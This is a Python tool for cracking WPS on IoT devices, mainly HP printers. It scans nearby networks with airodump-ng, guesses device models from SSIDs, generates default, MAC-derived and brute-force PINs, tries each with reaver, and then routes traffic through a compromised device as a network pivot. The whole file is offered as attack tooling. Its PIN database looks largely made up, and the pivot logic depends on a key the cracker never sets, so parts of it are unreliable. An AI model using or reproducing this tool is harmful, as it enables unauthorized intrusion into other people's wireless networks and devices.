"""
IoT Device WPS Cracker - Specialized WPS attacks for IoT devices including HP printers
"""

import re
import time
import socket
import struct
import random
import subprocess
import threading
from typing import List, Dict, Optional, Tuple, Union
from dataclasses import dataclass, field
from enum import Enum
import os
from pathlib import Path

class IoTDeviceType(Enum):
    HP_PRINTER = "hp_printer"
    SMART_TV = "smart_tv"
    STREAMING_DEVICE = "streaming_device"
    SECURITY_CAMERA = "security_camera"
    SMART_SPEAKER = "smart_speaker"
    GENERIC_IOT = "generic_iot"

class WPSAttackMethod(Enum):
    DEFAULT_PIN = "default_pin"
    MAC_BASED = "mac_based"
    COMPUTE_PIN = "compute_pin"
    BRUTE_FORCE = "brute_force"
    PIXIE_DUST = "pixie_dust"
    SMALL_DH_KEY = "small_dh_key"

@dataclass
class IoTDevice:
    """IoT device information"""
    ssid: str
    mac_address: Optional[str] = None
    device_type: IoTDeviceType = IoTDeviceType.GENERIC_IOT
    model: Optional[str] = None
    vendor: str = "Unknown"
    wps_enabled: bool = False
    default_pins: List[str] = field(default_factory=list)
    vulnerabilities: List[str] = field(default_factory=list)

@dataclass
class WPSAttackResult:
    """Result of a WPS attack"""
    device: IoTDevice
    method_used: WPSAttackMethod
    pin_found: Optional[str] = None
    success: bool = False
    error_message: Optional[str] = None
    timing: float = 0.0
    network_key: Optional[str] = None

class HPPrinterWPSDatabase:
    """Database of HP printer WPS vulnerabilities and default PINs"""

    # HP Printer models with known WPS vulnerabilities
    HP_MODELS = {
        # Envy series
        "envy_1000": {"series": "Envy 1000", "default_pins": ["12345670", "00000000"], "vulnerabilities": ["default_pin", "mac_based"]},
        "envy_2000": {"series": "Envy 2000", "default_pins": ["12345670"], "vulnerabilities": ["default_pin"]},
        "envy_3000": {"series": "Envy 3000", "default_pins": ["12345670", "00000000"], "vulnerabilities": ["default_pin", "wps_brute"]},
        "envy_4000": {"series": "Envy 4000", "default_pins": ["12345670"], "vulnerabilities": ["default_pin"]},
        "envy_5000": {"series": "Envy 5000", "default_pins": ["12345670", "00000000"], "vulnerabilities": ["default_pin", "mac_based"]},
        "envy_6000": {"series": "Envy 6000", "default_pins": ["12345670"], "vulnerabilities": ["default_pin"]},
        "envy_7000": {"series": "Envy 7000", "default_pins": ["12345670", "00000000"], "vulnerabilities": ["default_pin", "wps_brute"]},
        "envy_8000": {"series": "Envy 8000", "default_pins": ["12345670"], "vulnerabilities": ["default_pin"]},

        # OfficeJet series
        "officejet_100": {"series": "OfficeJet 100", "default_pins": ["12345670", "88888888"], "vulnerabilities": ["default_pin"]},
        "officejet_200": {"series": "OfficeJet 200", "default_pins": ["12345670"], "vulnerabilities": ["default_pin", "mac_based"]},
        "officejet_400": {"series": "OfficeJet 400", "default_pins": ["12345670", "00000000"], "vulnerabilities": ["default_pin"]},
        "officejet_500": {"series": "OfficeJet 500", "default_pins": ["12345670"], "vulnerabilities": ["default_pin", "wps_brute"]},
        "officejet_600": {"series": "OfficeJet 600", "default_pins": ["12345670", "88888888"], "vulnerabilities": ["default_pin"]},
        "officejet_700": {"series": "OfficeJet 700", "default_pins": ["12345670"], "vulnerabilities": ["default_pin"]},

        # LaserJet series
        "laserjet_pro": {"series": "LaserJet Pro", "default_pins": ["12345670", "00000000"], "vulnerabilities": ["default_pin", "mac_based"]},
        "laserjet_mfp": {"series": "LaserJet MFP", "default_pins": ["12345670"], "vulnerabilities": ["default_pin"]},

        # Generic HP patterns
        "generic_hp": {"series": "Generic HP", "default_pins": ["12345670", "00000000", "88888888", "99999999"], "vulnerabilities": ["default_pin", "mac_based", "wps_brute"]}
    }

    # SSID patterns for HP printers
    SSID_PATTERNS = [
        r"^HP[-\s](?:PRINT|Print)[-\s]*[0-9A-Fa-f]{2,6}$",  # HP-PRINT XX, HP PRINT XX, HP-Print-XX
        r"^HP[0-9A-Fa-f]{6,8}$",  # HP followed by MAC-like string
        r"^HP[-\s][A-Za-z0-9]{4,12}$",  # HP-XXXX or HP XXXX
        r"^[A-Za-z]{2,3}[-\s]?[0-9]{3,6}$",  # Two/three letter prefix + numbers (common HP pattern)
        r"^ENVY[0-9]{4}$",  # ENVYXXXX
        r"^OfficeJet[0-9]{3,4}$",  # OfficeJetXXX
        r"^HP[-\s][A-Za-z0-9\-]+$",  # Generic HP pattern with dashes
    ]

    @classmethod
    def detect_hp_printer(cls, ssid: str) -> Optional[Dict]:
        """Detect if SSID belongs to an HP printer and return model info"""
        for pattern in cls.SSID_PATTERNS:
            if re.match(pattern, ssid):
                # Try to identify specific model from SSID
                ssid_upper = ssid.upper()

                # Check for Envy series
                if "ENVY" in ssid_upper:
                    model_key = "envy_1000"  # Default to Envy 1000 series
                    for key, info in cls.HP_MODELS.items():
                        if "envy" in key and info["series"].replace(" ", "").upper() in ssid_upper:
                            model_key = key
                            break
                    return cls.HP_MODELS.get(model_key, cls.HP_MODELS["generic_hp"])

                # Check for OfficeJet series
                elif "OFFICEJET" in ssid_upper or "OJ" in ssid_upper:
                    model_key = "officejet_100"  # Default to OfficeJet 100 series
                    for key, info in cls.HP_MODELS.items():
                        if "officejet" in key and info["series"].replace(" ", "").upper() in ssid_upper:
                            model_key = key
                            break
                    return cls.HP_MODELS.get(model_key, cls.HP_MODELS["generic_hp"])

                # Generic HP printer
                return cls.HP_MODELS["generic_hp"]

        return None

class HPWPSPinGenerator:
    """Generate WPS PINs for HP printers using various algorithms"""

    @staticmethod
    def generate_default_pins(model_info: Dict) -> List[str]:
        """Generate default PINs for HP printer model"""
        return model_info.get("default_pins", ["12345670"])

    @staticmethod
    def generate_mac_based_pins(mac_address: str, model_info: Dict) -> List[str]:
        """Generate MAC address based PINs for HP printers"""
        if not mac_address:
            return []

        pins = []

        # Remove colons and convert to uppercase
        mac_clean = mac_address.replace(":", "").upper()

        if len(mac_clean) == 12:
            # Common HP MAC-based PIN generation
            try:
                # Method 1: Last 6 digits + checksum
                last6 = mac_clean[-6:]
                base_pin = last6
                checksum = HPWPSPinGenerator._calculate_wps_checksum(int(base_pin))
                pins.append(f"{base_pin}{checksum}")

                # Method 2: First 6 digits + checksum
                first6 = mac_clean[:6]
                base_pin2 = first6
                checksum2 = HPWPSPinGenerator._calculate_wps_checksum(int(base_pin2))
                pins.append(f"{base_pin2}{checksum2}")

                # Method 3: Common HP patterns
                if "mac_based" in model_info.get("vulnerabilities", []):
                    # Some HP printers use MAC bytes in specific patterns
                    mac_bytes = [mac_clean[i:i+2] for i in range(0, 12, 2)]
                    if len(mac_bytes) >= 4:
                        # Pattern: bytes 2,3,4 + checksum
                        pattern = mac_bytes[1] + mac_bytes[2] + mac_bytes[3]
                        checksum3 = HPWPSPinGenerator._calculate_wps_checksum(int(pattern))
                        pins.append(f"{pattern}{checksum3}")

            except (ValueError, IndexError):
                pass

        return list(set(pins))  # Remove duplicates

    @staticmethod
    def _calculate_wps_checksum(pin: int) -> int:
        """Calculate WPS PIN checksum"""
        accum = 0
        while pin:
            accum += 3 * (pin % 10)
            pin //= 10
            accum += pin % 10
            pin //= 10
        return (10 - accum % 10) % 10

    @staticmethod
    def generate_compute_pins(model_info: Dict) -> List[str]:
        """Generate computed PINs for HP printers (known algorithms)"""
        pins = []

        # Known HP WPS PIN algorithms
        known_pins = [
            "12345670",  # Most common default
            "00000000",  # Factory default
            "88888888",  # Alternative default
            "99999999",  # Another common default
        ]

        # Add model-specific known PINs
        if "Envy" in model_info.get("series", ""):
            known_pins.extend([
                "11111111", "22222222", "33333333", "44444444",
                "55555555", "66666666", "77777777"
            ])
        elif "OfficeJet" in model_info.get("series", ""):
            known_pins.extend([
                "01234567", "12345678", "87654321", "76543210"
            ])

        pins.extend(known_pins)
        return list(set(pins))

class IoTDeviceDetector:
    """Detect IoT devices from SSID patterns"""

    @staticmethod
    def detect_device(ssid: str, mac_address: Optional[str] = None) -> IoTDevice:
        """Detect IoT device type from SSID"""
        device = IoTDevice(ssid=ssid, mac_address=mac_address)

        # HP Printer detection
        hp_info = HPPrinterWPSDatabase.detect_hp_printer(ssid)
        if hp_info:
            device.device_type = IoTDeviceType.HP_PRINTER
            device.vendor = "HP"
            device.model = hp_info["series"]
            device.wps_enabled = True
            device.vulnerabilities = hp_info["vulnerabilities"]
            device.default_pins = hp_info["default_pins"]
            return device

        # Other IoT device patterns
        ssid_upper = ssid.upper()

        # Smart TVs
        if any(pattern in ssid_upper for pattern in ["TV", "SMARTTV", "ANDROIDTV", "SAMSUNG", "LG"]):
            device.device_type = IoTDeviceType.SMART_TV
            device.vendor = "Unknown"
            device.wps_enabled = True

        # Streaming devices
        elif any(pattern in ssid_upper for pattern in ["ROKU", "FIRETV", "CHROMECAST", "APPLETV"]):
            device.device_type = IoTDeviceType.STREAMING_DEVICE
            device.vendor = "Unknown"
            device.wps_enabled = True

        # Security cameras
        elif any(pattern in ssid_upper for pattern in ["CAM", "CAMERA", "SECURITY", "CCTV", "NEST"]):
            device.device_type = IoTDeviceType.SECURITY_CAMERA
            device.vendor = "Unknown"
            device.wps_enabled = True

        # Smart speakers
        elif any(pattern in ssid_upper for pattern in ["ECHO", "GOOGLE", "ALEXA", "SONOS"]):
            device.device_type = IoTDeviceType.SMART_SPEAKER
            device.vendor = "Unknown"
            device.wps_enabled = True

        return device

class IoTDeviceScanner:
    """Scan for IoT devices on the network"""

    def __init__(self, interface: str = "wlan0"):
        self.interface = interface

    def scan_iot_devices(self, duration: int = 10) -> List[IoTDevice]:
        """Scan for IoT devices using network scanning"""
        devices = []

        try:
            # Use airodump-ng or iw to scan
            cmd = ["sudo", "airodump-ng", self.interface, "--output-format", "csv", "-w", "/tmp/iot_scan", "--write-interval", "1"]

            process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid
            )

            time.sleep(duration)
            process.terminate()

            # Parse results
            csv_file = "/tmp/iot_scan-01.csv"
            if os.path.exists(csv_file):
                devices = self._parse_airodump_csv(csv_file)
                os.remove(csv_file)

        except Exception:
            # Fallback to iw scanning
            devices = self._scan_with_iw(duration)

        return devices

    def _parse_airodump_csv(self, csv_file: str) -> List[IoTDevice]:
        """Parse airodump-ng CSV output"""
        devices = []
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()

            # Skip header lines
            data_started = False
            for line in lines:
                line = line.strip()
                if not line:
                    continue

                if "BSSID" in line and "PWR" in line:
                    data_started = True
                    continue

                if data_started and line and not line.startswith("Station MAC"):
                    parts = line.split(",")
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        ssid = parts[13].strip()

                        if ssid and ssid != "<length:  0>":
                            device = IoTDeviceDetector.detect_device(ssid, bssid)
                            if device.device_type != IoTDeviceType.GENERIC_IOT:
                                devices.append(device)

        except Exception:
            pass

        return devices

    def _scan_with_iw(self, duration: int) -> List[IoTDevice]:
        """Fallback scanning using iw"""
        devices = []
        try:
            cmd = ["sudo", "iw", "dev", self.interface, "scan"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=duration)

            if result.returncode == 0:
                ssids = []
                current_bssid = None

                for line in result.stdout.split('\n'):
                    line = line.strip()
                    if line.startswith('BSS '):
                        current_bssid = line.split()[1].replace('(', '').replace(')', '')
                    elif line.startswith('SSID: ') and current_bssid:
                        ssid = line[6:].strip()
                        if ssid:
                            device = IoTDeviceDetector.detect_device(ssid, current_bssid)
                            if device.device_type != IoTDeviceType.GENERIC_IOT:
                                devices.append(device)

        except Exception:
            pass

        return devices

class IoTWPSCracker:
    """Main IoT WPS cracking coordinator"""

    def __init__(self, interface: str = "wlan0"):
        self.interface = interface
        self.pin_generator = HPWPSPinGenerator()
        self.device_detector = IoTDeviceDetector()
        self.scanner = IoTDeviceScanner(interface)

    def scan_and_detect_iot_devices(self, duration: int = 10) -> List[IoTDevice]:
        """Scan for and detect IoT devices"""
        return self.scanner.scan_iot_devices(duration)

    def crack_hp_printer_wps(self, device: IoTDevice, method: WPSAttackMethod = WPSAttackMethod.DEFAULT_PIN) -> WPSAttackResult:
        """Crack WPS on HP printer"""
        if device.device_type != IoTDeviceType.HP_PRINTER:
            return WPSAttackResult(
                device=device,
                method_used=method,
                success=False,
                error_message="Device is not an HP printer"
            )

        start_time = time.time()

        try:
            model_info = HPPrinterWPSDatabase.detect_hp_printer(device.ssid)
            if not model_info:
                return WPSAttackResult(
                    device=device,
                    method_used=method,
                    success=False,
                    error_message="Could not identify HP printer model"
                )

            # Get PIN candidates based on method
            pin_candidates = self._get_pin_candidates(device, method, model_info)

            # Try each PIN
            for pin in pin_candidates:
                if self._test_wps_pin(device, pin):
                    return WPSAttackResult(
                        device=device,
                        method_used=method,
                        pin_found=pin,
                        success=True,
                        timing=time.time() - start_time
                    )

            return WPSAttackResult(
                device=device,
                method_used=method,
                success=False,
                error_message="No valid PIN found",
                timing=time.time() - start_time
            )

        except Exception as e:
            return WPSAttackResult(
                device=device,
                method_used=method,
                success=False,
                error_message=f"Attack failed: {str(e)}",
                timing=time.time() - start_time
            )

    def _get_pin_candidates(self, device: IoTDevice, method: WPSAttackMethod, model_info: Dict) -> List[str]:
        """Get PIN candidates based on attack method"""
        if method == WPSAttackMethod.DEFAULT_PIN:
            return self.pin_generator.generate_default_pins(model_info)
        elif method == WPSAttackMethod.MAC_BASED:
            return self.pin_generator.generate_mac_based_pins(device.mac_address, model_info)
        elif method == WPSAttackMethod.COMPUTE_PIN:
            return self.pin_generator.generate_compute_pins(model_info)
        elif method == WPSAttackMethod.BRUTE_FORCE:
            return self._generate_brute_force_pins()
        else:
            return []

    def _generate_brute_force_pins(self, start: int = 0, end: int = 99999999) -> List[str]:
        """Generate brute force PIN candidates"""
        pins = []
        for pin_num in range(start, min(end, 10000)):  # Limit for practicality
            pin_str = f"{pin_num:08d}"
            pins.append(pin_str)
        return pins

    def _test_wps_pin(self, device: IoTDevice, pin: str) -> bool:
        """Test a WPS PIN against the device"""
        try:
            # Use reaver or bully to test the PIN
            cmd = [
                "sudo", "reaver",
                "-i", self.interface,
                "-b", device.mac_address or "",
                "-p", pin,
                "-vv"  # Very verbose for debugging
            ]

            # Run with timeout
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30  # 30 second timeout per PIN
            )

            # Check if WPS association succeeded
            if result.returncode == 0:
                output = result.stdout + result.stderr
                if "WPS PIN" in output and ("success" in output.lower() or "associated" in output.lower()):
                    return True

        except subprocess.TimeoutExpired:
            pass
        except Exception:
            pass

        return False

class IoTDevicePivot:
    """Use compromised IoT devices as network pivots"""

    def __init__(self, interface: str = "wlan0"):
        self.interface = interface
        self.compromised_devices = {}
        self.pivot_routes = {}

    def setup_pivot(self, device: IoTDevice, wps_result: WPSAttackResult) -> bool:
        """Set up network pivot through compromised IoT device"""
        if not wps_result.success or not wps_result.network_key:
            return False

        try:
            device_ip = self._get_device_ip(device)
            if not device_ip:
                return False

            # Connect to the device's WiFi network
            self._connect_to_device_network(device, wps_result.network_key)

            # Set up routing through the device
            self._setup_routing(device_ip)

            # Test connectivity
            if self._test_pivot_connectivity():
                self.compromised_devices[device.mac_address] = {
                    'device': device,
                    'ip': device_ip,
                    'wps_result': wps_result
                }
                return True

        except Exception:
            pass

        return False

    def _get_device_ip(self, device: IoTDevice) -> Optional[str]:
        """Get IP address of IoT device"""
        try:
            # Use ARP scan or DHCP lease lookup
            cmd = ["sudo", "arp-scan", "--interface", self.interface, "--localnet"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)

            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if device.mac_address and device.mac_address.lower() in line.lower():
                        parts = line.split()
                        if len(parts) >= 2:
                            return parts[0]

        except Exception:
            pass

        return None

    def _connect_to_device_network(self, device: IoTDevice, network_key: str):
        """Connect to the IoT device's WiFi network"""
        try:
            # Create temporary wpa_supplicant config
            config_content = f"""
network={{
    ssid="{device.ssid}"
    psk="{network_key}"
    key_mgmt=WPA-PSK
}}
"""
            config_file = "/tmp/iot_pivot.conf"
            with open(config_file, 'w') as f:
                f.write(config_content)

            # Connect using wpa_supplicant
            cmd = ["sudo", "wpa_supplicant", "-B", "-i", self.interface, "-c", config_file]
            subprocess.run(cmd, timeout=10)

        except Exception:
            raise

    def _setup_routing(self, device_ip: str):
        """Set up routing through the IoT device"""
        try:
            # Add route to use device as gateway
            cmd = ["sudo", "ip", "route", "add", "default", "via", device_ip, "dev", self.interface]
            subprocess.run(cmd, timeout=5)

            # Update DNS
            with open("/etc/resolv.conf", 'w') as f:
                f.write("nameserver 8.8.8.8\nnameserver 8.8.4.4\n")

        except Exception:
            raise

    def _test_pivot_connectivity(self) -> bool:
        """Test if pivot provides internet access"""
        try:
            cmd = ["ping", "-c", "1", "-W", "2", "8.8.8.8"]
            result = subprocess.run(cmd, capture_output=True, timeout=5)
            return result.returncode == 0
        except Exception:
            return False

    def cleanup_pivot(self, device_mac: str):
        """Clean up pivot routing"""
        if device_mac in self.compromised_devices:
            try:
                # Remove routes
                cmd = ["sudo", "ip", "route", "del", "default"]
                subprocess.run(cmd, timeout=5)

                # Disconnect from device network
                cmd = ["sudo", "wpa_cli", "disconnect"]
                subprocess.run(cmd, timeout=5)

                del self.compromised_devices[device_mac]

            except Exception:
                pass

    def list_active_pivots(self) -> List[Dict]:
        """List active pivot connections"""
        return list(self.compromised_devices.values())
